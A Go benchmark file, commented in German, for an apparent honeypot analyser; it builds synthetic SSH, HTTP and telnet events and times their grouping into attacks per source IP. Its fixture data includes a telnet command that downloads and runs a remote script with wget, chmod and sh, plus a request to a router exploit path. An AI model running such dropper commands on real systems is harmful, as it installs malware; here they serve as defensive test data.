package main

import (
	"encoding/json"
	"fmt"
	"testing"
	"time"
)

// benchEvents: Mischung wie auf einem Pi-Sensor (viele Verbindungen und Logins, Web-Anfragen
// mit Kopfzeilen, einige Befehle). Nur Dokumentationsadressen.
func benchEvents(n int) []*Event {
	hdr := "Accept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36\nCookie: session=0123456789abcdef0123456789abcdef; lang=de"
	base := time.Now().Add(-20 * time.Hour)
	out := make([]*Event, 0, n)
	for i := 0; i < n; i++ {
		e := &Event{TS: base.Add(time.Duration(i) * 2 * time.Second), SrcIP: fmt.Sprintf("198.51.100.%d", i%200), Service: "ssh", DstPort: 22, Session: fmt.Sprintf("s%d", i/5)}
		var d map[string]any
		switch i % 10 {
		case 0, 1, 2:
			e.Type = "connect"
		case 3, 4, 5:
			e.Type, e.Username, e.Password = "login", "root", fmt.Sprintf("pw%d", i%50)
		case 6, 7:
			e.Type, e.Service, e.DstPort = "request", "http", 80
			d = map[string]any{"method": "GET", "path": fmt.Sprintf("/cgi-bin/luci/;stok=/locale?form=country&x=%d", i), "headers": hdr, "user_agent": "Mozilla/5.0", "body": ""}
		case 8:
			e.Type, e.Service, e.DstPort = "command", "telnet", 23
			d = map[string]any{"input": "cd /tmp || cd /var/run; wget http://203.0.113.5/bins.sh; chmod 777 bins.sh; sh bins.sh; echo dGVzdCB0ZXN0IHRlc3QgdGVzdA== | base64 -d"}
		default:
			e.Type = "disconnect"
		}
		if d != nil {
			e.Data, _ = json.Marshal(d)
		}
		out = append(out, e)
	}
	return out
}

// BenchmarkAttackBuild: Aufbau mit gefülltem Zwischenspeicher der Musterprüfung (Normalfall:
// store.go prüft jedes Ereignis beim Einliefern). Cold: ohne Zwischenspeicher.
func BenchmarkAttackBuild(b *testing.B)     { benchAttackBuild(b, false) }
func BenchmarkAttackBuildCold(b *testing.B) { benchAttackBuild(b, true) }

func benchAttackBuild(b *testing.B, cold bool) {
	evs := benchEvents(20000)
	for _, e := range evs { // wie beim Einliefern
		analysisText(e)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if cold {
			resetAnalysisCache()
		}
		byIP := map[string]*Attack{}
		for _, e := range evs {
			a := byIP[e.SrcIP]
			if a == nil {
				a = newAttack(e)
				byIP[e.SrcIP] = a
			}
			a.add(e)
		}
		for _, a := range byIP {
			a.finish()
		}
	}
}
